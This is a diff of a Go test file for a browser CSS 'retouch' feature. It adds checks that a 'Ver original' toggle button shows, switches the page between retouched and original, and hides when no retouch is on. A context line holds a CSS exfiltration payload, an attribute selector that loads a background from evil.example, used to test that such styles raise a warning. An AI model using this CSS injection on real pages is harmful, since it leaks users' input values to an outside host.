@@ -126,6 +126,25 @@ func TestRetouches(t *testing.T) {
 	rh.waitBackground(t, dark)
 	rh.fail(t, "retouch_toggle", map[string]any{"name": "nada", "on": true}, `no retouch named "nada"`)
 
+	// O botão "Ver original" do selo: aparece com retoque ligado e alterna na hora.
+	rh.waitOverlayText(t, "Ver original")
+	rh.clickOverlay(t, "toggle_original")
+	rh.waitBackground(t, plain)
+	rh.waitOverlayText(t, "Ver retocado")
+	rh.clickOverlay(t, "toggle_original")
+	rh.waitBackground(t, dark)
+	// Sem retoque ligado, o botão some.
+	rh.ok(t, "retouch_toggle", map[string]any{"name": "tema-escuro", "on": false})
+	deadline := time.Now().Add(3 * time.Second)
+	for strings.Contains(rh.overlayText(t), "Ver original") {
+		if time.Now().After(deadline) {
+			t.Fatalf("the button should hide without retouches: %q", rh.overlayText(t))
+		}
+		time.Sleep(50 * time.Millisecond)
+	}
+	rh.ok(t, "retouch_toggle", map[string]any{"name": "tema-escuro", "on": true})
+	rh.waitOverlayText(t, "Ver original")
+
 	// CSS que busca algo em outro host: o save é recusado sem ignoreWarnings.
 	prev = rh.ok(t, "retouch_preview", map[string]any{"css": `input[value^="a"] { background: url(https://evil.example/a) }`})
 	mustContain(t, prev, "warnings:", "evil.example")
